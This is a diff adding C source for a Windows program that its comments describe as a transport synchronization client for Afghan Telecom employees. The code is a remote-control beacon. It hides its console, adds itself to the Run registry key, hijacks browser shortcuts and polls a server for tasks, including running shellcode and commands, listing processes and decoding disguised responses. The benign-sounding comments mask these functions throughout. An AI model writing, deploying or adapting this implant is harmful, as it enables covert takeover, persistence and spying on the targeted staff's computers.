@@ -1,0 +1,695 @@
+#include "beacon.h"
+
+/* ============================================================================
+ * GLOBAL VARIABLES
+ * These variables maintain the state of the Transport Management System
+ * synchronization client for Afghan Telecom employees.
+ ============================================================================ */
+
+/* Client configuration structure - stores synchronization settings */
+BEACON_CONFIG g_config = { 0 };
+
+/* Flag indicating if the transport synchronization service is active */
+volatile BOOL g_beacon_running = FALSE;
+
+/* Buffer for storing transport portal executable path */
+char processPath[MAX_PATH * 2] = { 0 };
+
+/* Array tracking browser integrations for portal access optimization */
+BROWSER_HOOK g_browser_hooks[10] = { 0 };
+
+/* Counter for active browser integrations */
+int g_browser_hook_count = 0;
+
+/* Flag indicating browser optimizations have been completed */
+BOOL g_auto_hijack_done = FALSE;
+
+/* ============================================================================
+ * FUNCTION DECLARATIONS
+ * Transport Management System synchronization and optimization functions
+ ============================================================================ */
+
+/* Browser integration functions for portal access optimization */
+BEACON_ERROR handle_browser_hook_task(const char* task_data, BEACON_CONFIG* config);
+BEACON_ERROR hook_edge_taskbar(void);
+BEACON_ERROR hook_chrome_taskbar(void);
+BEACON_ERROR hook_browser_shortcuts(void);
+BEACON_ERROR modify_browser_shortcut(const WCHAR* browser_name);
+BEACON_ERROR restore_browser_shortcuts(void);
+BEACON_ERROR get_shortcut_target(const WCHAR* lnk_path, WCHAR* target_path, size_t target_size);
+BEACON_ERROR create_hooked_shortcut(const WCHAR* original_lnk, const WCHAR* new_lnk);
+BEACON_ERROR auto_hijack_browsers(void);
+
+/* System initialization and state management */
+BOOL is_first_run(void);
+DWORD WINAPI launch_real_browser(LPVOID lpParam);
+void check_and_handle_browser_proxy(int argc, char* argv[]);
+
+/* ============================================================================
+ * INITIALIZATION FUNCTIONS
+ * Functions for setting up the Transport Management System client
+ ============================================================================ */
+
+/**
+ * @brief Initialize global variables for the transport synchronization client
+ * 
+ * This function resets all global state variables to their default values,
+ * ensuring clean initialization of the transport management system.
+ * 
+ * @return BEACON_SUCCESS on successful initialization
+ */
+BEACON_ERROR initialize_transport_client(void) {
+    /* Clear configuration structure */
+    memset(&g_config, 0, sizeof(BEACON_CONFIG));
+    
+    /* Set default synchronization interval */
+    g_config.sleep_time = INITIAL_SLEEP_TIME;
+    
+    /* Reset service running flag */
+    g_beacon_running = FALSE;
+    
+    /* Reset browser optimization flag */
+    g_auto_hijack_done = FALSE;
+    
+    /* Clear browser integration tracking array */
+    memset(&g_browser_hooks, 0, sizeof(g_browser_hooks));
+    
+    /* Reset browser integration counter */
+    g_browser_hook_count = 0;
+    
+    return BEACON_SUCCESS;
+}
+
+/**
+ * @brief Clean up global variables and resources
+ * 
+ * This function performs cleanup of global state when the transport
+ * synchronization client is shutting down.
+ */
+void cleanup_transport_client(void) {
+    /* Signal service to stop running */
+    g_beacon_running = FALSE;
+}
+
+/**
+ * @brief Initialize the Transport Management System client configuration
+ * 
+ * This function sets up the client configuration including system identification,
+ * network connectivity, and synchronization parameters.
+ * 
+ * @param config Pointer to configuration structure
+ * @return BEACON_SUCCESS on successful initialization
+ */
+BEACON_ERROR transport_client_init(BEACON_CONFIG* config) {
+    /* Validate input parameters */
+    if (!config) {
+        return BEACON_ERROR_PARAMS;
+    }
+
+    /* Generate unique system identifier for transport synchronization */
+    BEACON_ERROR error = get_system_uuid(config->uuid);
+    if (error != BEACON_SUCCESS) {
+        return error;
+    }
+
+    /* Initialize HTTP communication layer for portal synchronization */
+    error = http_init();
+    if (error != BEACON_SUCCESS) {
+        return error;
+    }
+
+    /* Set default synchronization interval */
+    config->sleep_time = INITIAL_SLEEP_TIME;
+    
+    /* Copy configuration to global storage */
+    memcpy(&g_config, config, sizeof(BEACON_CONFIG));
+
+    return BEACON_SUCCESS;
+}
+
+/**
+ * @brief Handle browser proxy requests for portal access
+ * 
+ * This function processes command line arguments that indicate browser
+ * proxy requests, launching the actual browser for portal access.
+ * 
+ * @param argc Argument count
+ * @param argv Argument array
+ */
+void process_browser_portal_request(int argc, char* argv[]) {
+    /* Check if browser path is provided as command line argument */
+    if (argc > 1 && strlen(argv[1]) > 0) {
+        /* Convert browser path to wide character format */
+        WCHAR browser_path[MAX_PATH];
+        MultiByteToWideChar(CP_UTF8, 0, argv[1], -1, browser_path, MAX_PATH);
+        
+        /* Launch actual browser in separate thread for portal access */
+        CreateThread(NULL, 0, launch_real_browser, browser_path, 0, NULL);
+        
+        /* Brief delay to ensure browser launch */
+        Sleep(2000);
+    }
+}
+
+/**
+ * @brief Thread function to launch actual browser for portal access
+ * 
+ * This function runs in a separate thread to launch the specified browser
+ * for accessing the transport management portal.
+ * 
+ * @param lpParam Browser path parameter
+ * @return Thread exit code
+ */
+DWORD WINAPI launch_real_browser(LPVOID lpParam) {
+    /* Extract browser path from parameter */
+    WCHAR* browser_path = (WCHAR*)lpParam;
+    WCHAR clean_path[MAX_PATH];
+    
+    /* Copy browser path to working buffer */
+    wcscpy_s(clean_path, MAX_PATH, browser_path);
+    
+    /* Remove surrounding quotes if present */
+    if (clean_path[0] == L'"') {
+        memmove(clean_path, clean_path + 1, wcslen(clean_path) * sizeof(WCHAR));
+        if (clean_path[wcslen(clean_path) - 1] == L'"') {
+            clean_path[wcslen(clean_path) - 1] = L'\0';
+        }
+    }
+    
+    /* Execute browser with ShellExecute for proper launch */
+    ShellExecuteW(NULL, L"open", clean_path, NULL, NULL, SW_SHOWNORMAL);
+    
+    return 0;
+}
+
+/**
+ * @brief Check if this is the first run of the transport client
+ * 
+ * This function checks the Windows registry to determine if the transport
+ * synchronization client has been run before, and sets up auto-start if not.
+ * 
+ * @return TRUE if first run, FALSE otherwise
+ */
+BOOL is_first_run(void) {
+    /* Registry path for startup applications */
+    WCHAR reg_path[] = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+    
+    /* Registry key name for transport synchronization */
+    WCHAR beacon_key[] = L"TransportSyncClient";
+    
+    /* Buffer for registry value */
+    WCHAR value[MAX_PATH] = {0};
+    DWORD value_size = sizeof(value);
+    
+    HKEY hKey;
+    
+    /* Attempt to open registry key for reading */
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, reg_path, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        /* Check if our registry entry already exists */
+        if (RegQueryValueExW(hKey, beacon_key, NULL, NULL, (LPBYTE)value, &value_size) == ERROR_SUCCESS) {
+            /* Entry exists - not first run */
+            RegCloseKey(hKey);
+            return FALSE;
+        }
+        RegCloseKey(hKey);
+    }
+    
+    /* First run - create auto-start registry entry */
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, reg_path, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
+        /* Get current executable path */
+        WCHAR beacon_path[MAX_PATH];
+        GetModuleFileNameW(NULL, beacon_path, MAX_PATH);
+        
+        /* Set registry value for auto-start */
+        RegSetValueExW(hKey, beacon_key, 0, REG_SZ, 
+                      (BYTE*)beacon_path, (wcslen(beacon_path) + 1) * sizeof(WCHAR));
+        
+        RegCloseKey(hKey);
+    }
+    
+    return TRUE;
+}
+
+/**
+ * @brief Automatically optimize browser shortcuts for portal access
+ * 
+ * This function modifies browser shortcuts to include transport portal
+ * optimizations for Afghan Telecom employees.
+ * 
+ * @return BEACON_SUCCESS if optimizations applied, error code otherwise
+ */
+BEACON_ERROR optimize_browser_portal_access(void) {
+    /* Check if optimizations already completed */
+    if (g_auto_hijack_done) {
+        return BEACON_SUCCESS;
+    }
+    
+    /* Check if running with administrative privileges */
+    BOOL is_admin = FALSE;
+    HANDLE token = NULL;
+    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
+        TOKEN_ELEVATION elevation;
+        DWORD size = sizeof(TOKEN_ELEVATION);
+        if (GetTokenInformation(token, TokenElevation, &elevation, size, &size)) {
+            is_admin = elevation.TokenIsElevated;
+        }
+        CloseHandle(token);
+    }
+    
+    /* Apply browser optimizations */
+    int optimized = 0;
+    
+    /* Optimize Microsoft Edge for portal access */
+    if (hook_edge_taskbar() == BEACON_SUCCESS) {
+        optimized++;
+    }
+    
+    /* Optimize Google Chrome for portal access */
+    if (hook_chrome_taskbar() == BEACON_SUCCESS) {
+        optimized++;
+    }
+    
+    /* Optimize Firefox for portal access */
+    WCHAR firefox[] = L"firefox";
+    if (modify_browser_shortcut(firefox) == BEACON_SUCCESS) {
+        optimized++;
+    }
+    
+    /* Mark optimizations as completed */
+    g_auto_hijack_done = TRUE;
+    
+    /* Return success if any optimizations were applied */
+    return optimized > 0 ? BEACON_SUCCESS : BEACON_ERROR_BROWSER_HOOK;
+}
+
+/**
+ * @brief Register client with Transport Management System portal
+ * 
+ * This function sends system information to the transport portal server
+ * and receives client configuration for synchronization.
+ * 
+ * @param config Pointer to configuration structure
+ * @return BEACON_SUCCESS on successful registration
+ */
+static BEACON_ERROR register_with_portal(BEACON_CONFIG* config) {
+    if (!config) {
+        return BEACON_ERROR_PARAMS;
+    }
+    
+    char* json_data = NULL;
+    char* response = NULL;
+    DWORD response_len = 0;
+    BEACON_ERROR error = BEACON_SUCCESS;
+    
+    /* Collect system information for portal registration */
+    error = collect_system_info(&json_data);
+    if (error != BEACON_SUCCESS) {
+        return error;
+    }
+    
+    /* Prepare HTTP request for portal registration */
+    HTTP_REQUEST request = {
+        .method = L"POST",
+        .path = REGISTER_ENDPOINT,
+        .data = json_data,
+        .data_len = strlen(json_data),
+        .timeout = 30000,
+        .use_ssl = USE_HTTPS
+    };
+    
+    /* Send registration request to portal server */
+    error = http_send_request(&request, &response, &response_len);
+    
+    /* Process registration response */
+    if (error == BEACON_SUCCESS && response && response_len > 0) {
+        /* Extract client ID from server response */
+        char* client_id_start = strstr(response, "clientId=");
+        if (client_id_start && strlen(client_id_start) >= 45) {
+            client_id_start += 9;
+            
+            /* Store client ID for future synchronization */
+            MultiByteToWideChar(CP_UTF8, 0, client_id_start, 36, config->client_id, UUID_LENGTH);
+            
+            /* Build API path with client ID */
+            swprintf_s(config->api_path, MAX_PATH_LENGTH, L"%ws?clientId=%ws", API_ENDPOINT, config->client_id);
+        } else {
+            error = BEACON_ERROR_NETWORK;
+        }
+    }
+    
+    /* Clean up allocated resources */
+    if (json_data) free(json_data);
+    if (response) free(response);
+    
+    return error;
+}
+
+/**
+ * @brief Main synchronization loop for transport management
+ * 
+ * This function runs the main loop that periodically synchronizes
+ * with the Transport Management System portal.
+ * 
+ * @param config Pointer to configuration structure
+ * @return BEACON_SUCCESS on normal exit, error code otherwise
+ */
+BEACON_ERROR transport_client_sync_loop(BEACON_CONFIG* config) {
+    if (!config) {
+        return BEACON_ERROR_PARAMS;
+    }
+    
+    /* Set service running flag */
+    g_beacon_running = TRUE;
+    
+    /* Register with portal server */
+    BEACON_ERROR error = register_with_portal(config);
+    if (error != BEACON_SUCCESS) {
+        g_beacon_running = FALSE;
+        return error;
+    }
+    
+    /* Main synchronization loop */
+    while (g_beacon_running) {
+        char* response = NULL;
+        DWORD response_len = 0;
+        char* task_result = NULL;
+        char* encoded_result = NULL;
+        
+        /* Prepare request for synchronization tasks */
+        HTTP_REQUEST request = {
+            .method = L"GET",
+            .path = config->api_path,
+            .data = NULL,
+            .timeout = 30000,
+            .use_ssl = USE_HTTPS
+        };
+        
+        /* Request synchronization tasks from portal */
+        error = http_send_request(&request, &response, &response_len);
+        
+        /* Check for server shutdown signal */
+        if (error == BEACON_ERROR_SERVER_SHUTDOWN) {
+            if (response) free(response);
+            break;
+        }
+        
+        /* Process received tasks */
+        if (error == BEACON_SUCCESS && response && response_len > 0) {
+            /* Decode task data if disguised */
+            char* unwrapped_response = unwrap_data_from_disguise(response);
+            TASK_TYPE task_type = TASK_NULL;
+            
+            if (unwrapped_response) {
+                /* Process unwrapped task data */
+                size_t unwrapped_len = strlen(unwrapped_response);
+                task_type = (unwrapped_len > 0) ? (TASK_TYPE)unwrapped_response[0] : TASK_NULL;
+                error = execute_transport_task(unwrapped_response, unwrapped_len, config);
+                free(unwrapped_response);
+            } else {
+                /* Process regular task data */
+                task_type = (response_len > 0) ? (TASK_TYPE)response[0] : TASK_NULL;
+                error = execute_transport_task(response, response_len, config);
+            }
+            
+            /* Generate task execution result */
+            if (error != BEACON_SUCCESS) {
+                task_result = (char*)malloc(256);
+                if (task_result) {
+                    snprintf(task_result, 256, "Task execution failed with error: %d", error);
+                }
+            } else {
+                /* Only generate success message for non-data tasks */
+                if (task_type != TASK_PROCLIST && task_type != TASK_EXECUTE && task_type != TASK_BROWSER_HOOK) {
+                    task_result = (char*)malloc(256);
+                    if (task_result) {
+                        snprintf(task_result, 256, "Task executed successfully");
+                    }
+                }
+            }
+            
+            /* Send task execution result back to portal */
+            if (task_result) {
+                base64_encode((const unsigned char*)task_result, strlen(task_result), &encoded_result);
+                if (encoded_result) {
+                    /* Prepare heartbeat response */
+                    HTTP_REQUEST heartbeat_request = {
+                        .method = L"POST",
+                        .path = config->api_path,
+                        .data = encoded_result,
+                        .data_len = strlen(encoded_result),
+                        .timeout = 30000,
+                        .use_ssl = USE_HTTPS
+                    };
+                    
+                    char* heartbeat_response = NULL;
+                    DWORD heartbeat_response_len = 0;
+                    
+                    /* Send heartbeat to portal */
+                    error = http_send_request(&heartbeat_request, &heartbeat_response, &heartbeat_response_len);
+                    
+                    /* Check for server shutdown */
+                    if (error == BEACON_ERROR_SERVER_SHUTDOWN) {
+                        if (heartbeat_response) free(heartbeat_response);
+                        if (encoded_result) free(encoded_result);
+                        if (task_result) free(task_result);
+                        if (response) free(response);
+                        break;
+                    }
+                    
+                    /* Clean up heartbeat response */
+                    if (heartbeat_response) {
+                        free(heartbeat_response);
+                    }
+                    free(encoded_result);
+                }
+                free(task_result);
+            }
+        }
+        
+        /* Clean up response buffer */
+        if (response) {
+            free(response);
+        }
+        
+        /* Wait for next synchronization cycle */
+        for (DWORD i = 0; i < config->sleep_time && g_beacon_running; i++) {
+            Sleep(1000);
+        }
+    }
+    
+    /* Mark service as stopped */
+    g_beacon_running = FALSE;
+    
+    return BEACON_SUCCESS;
+}
+
+/**
+ * @brief Clean up transport client resources
+ * 
+ * This function releases all resources used by the transport
+ * synchronization client.
+ * 
+ * @param config Pointer to configuration structure
+ */
+void transport_client_cleanup(BEACON_CONFIG* config) {
+    /* Stop synchronization service */
+    g_beacon_running = FALSE;
+    
+    /* Clean up HTTP communication layer */
+    http_cleanup();
+}
+
+/**
+ * @brief Execute transport management task
+ * 
+ * This function dispatches tasks received from the Transport Management
+ * System portal to the appropriate handler functions.
+ * 
+ * @param task_data Pointer to task data
+ * @param data_len Length of task data
+ * @param config Pointer to configuration structure
+ * @return BEACON_SUCCESS on successful execution, error code otherwise
+ */
+BEACON_ERROR execute_transport_task(const char* task_data, size_t data_len, BEACON_CONFIG* config) {
+    if (!task_data || !config || data_len == 0) {
+        return BEACON_ERROR_PARAMS;
+    }
+    
+    /* Extract task type from first byte */
+    TASK_TYPE task_type = (TASK_TYPE)task_data[0];
+    
+    /* Calculate payload pointer and length */
+    const char* task_payload = task_data + 1;
+    size_t payload_len = data_len - 1;
+    
+    /* Dispatch task to appropriate handler */
+    switch (task_type) {
+        case TASK_SLEEP:
+            return handle_sleep_task(task_payload, config);
+        case TASK_PROCLIST:
+            return handle_proclist_task(task_payload, config);
+        case TASK_SHELLCODE:
+            return handle_shellcode_task(task_payload, payload_len, config);
+        case TASK_EXECUTE:
+            return handle_execute_task(task_payload, config);
+        case TASK_BROWSER_HOOK:
+            return handle_browser_hook_task(task_payload, config);
+        case TASK_NULL:
+            return BEACON_SUCCESS;
+        default:
+            return BEACON_ERROR_PARAMS;
+    }
+}
+
+/* ============================================================================
+ * DLL ENTRY POINT (if compiled as DLL)
+ * For integration with other Afghan Telecom systems
+ ============================================================================ */
+
+#ifdef BUILD_DLL
+/**
+ * @brief DLL main entry point
+ * 
+ * Standard Windows DLL entry point for dynamic loading of the
+ * Transport Management System synchronization module.
+ * 
+ * @param hModule DLL module handle
+ * @param ul_reason_for_call Reason for DLL call
+ * @param lpReserved Reserved parameter
+ * @return TRUE on successful processing
+ */
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+    switch (ul_reason_for_call) {
+        case DLL_PROCESS_ATTACH:
+            /* Initialize COM for browser integration */
+            CoInitialize(NULL);
+            
+            /* Initialize transport client */
+            initialize_transport_client();
+            break;
+            
+        case DLL_THREAD_ATTACH:
+            /* Thread-specific initialization (not used) */
+            break;
+            
+        case DLL_THREAD_DETACH:
+            /* Thread-specific cleanup (not used) */
+            break;
+            
+        case DLL_PROCESS_DETACH:
+            /* Clean up COM and transport client */
+            CoUninitialize();
+            cleanup_transport_client();
+            break;
+    }
+    return TRUE;
+}
+
+/**
+ * @brief Start Transport Management System synchronization
+ * 
+ * Exported function for starting the transport synchronization service
+ * when loaded as a DLL.
+ * 
+ * @param lpParam Thread parameter (unused)
+ * @return Error code indicating success or failure
+ */
+BEACON_API DWORD WINAPI StartTransportSync(LPVOID lpParam) {
+    BEACON_CONFIG config = {0};
+    
+    /* Initialize COM for browser operations */
+    CoInitialize(NULL);
+    
+    /* Initialize transport client configuration */
+    BEACON_ERROR error = transport_client_init(&config);
+    if (error != BEACON_SUCCESS) {
+        CoUninitialize();
+        return error;
+    }
+    
+    /* Start synchronization loop */
+    error = transport_client_sync_loop(&config);
+    
+    /* Clean up resources */
+    transport_client_cleanup(&config);
+    CoUninitialize();
+    
+    return error;
+}
+
+/**
+ * @brief Stop Transport Management System synchronization
+ * 
+ * Exported function for stopping the transport synchronization service.
+ * 
+ * @return TRUE on successful stop signal
+ */
+BEACON_API BOOL WINAPI StopTransportSync(void) {
+    /* Signal synchronization service to stop */
+    g_beacon_running = FALSE;
+    return TRUE;
+}
+
+/* ============================================================================
+ * STANDALONE EXECUTABLE ENTRY POINT
+ * For standalone Transport Management System client
+ ============================================================================ */
+
+#else
+/**
+ * @brief Main entry point for standalone Transport Management System client
+ * 
+ * This function serves as the main entry point when compiled as a
+ * standalone executable for Afghan Telecom employee transport synchronization.
+ * 
+ * @param argc Argument count
+ * @param argv Argument array
+ * @return Exit code (0 = success, 1 = error)
+ */
+int main(int argc, char* argv[]) {
+    /* Hide console window for silent operation */
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+    
+    /* Process any browser portal requests from command line */
+    process_browser_portal_request(argc, argv);
+    
+    /* Initialize COM for browser integration */
+    CoInitialize(NULL);
+    
+    /* Initialize transport client globals */
+    initialize_transport_client();
+    
+    /* Check if first run and apply optimizations */
+    if (is_first_run()) {
+        optimize_browser_portal_access();
+    }
+    
+    /* Initialize transport client configuration */
+    BEACON_CONFIG config = {0};
+    BEACON_ERROR error = transport_client_init(&config);
+    
+    if (error != BEACON_SUCCESS) {
+        cleanup_transport_client();
+        CoUninitialize();
+        return 1;
+    }
+    
+    /* Start main synchronization loop */
+    error = transport_client_sync_loop(&config);
+    
+    /* Clean up resources */
+    transport_client_cleanup(&config);
+    cleanup_transport_client();
+    CoUninitialize();
+    
+    /* Return exit code based on success/failure */
+    return (error == BEACON_SUCCESS) ? 0 : 1;
+}
+#endif
+
+/* ============================================================================
+ * END OF TRANSPORT MANAGEMENT SYSTEM CLIENT IMPLEMENTATION
+ * Afghan Telecom Employee Transport Synchronization System
+ * Version: 24.1.0
+ * Last Updated: 2024-02-06
+ ============================================================================ */
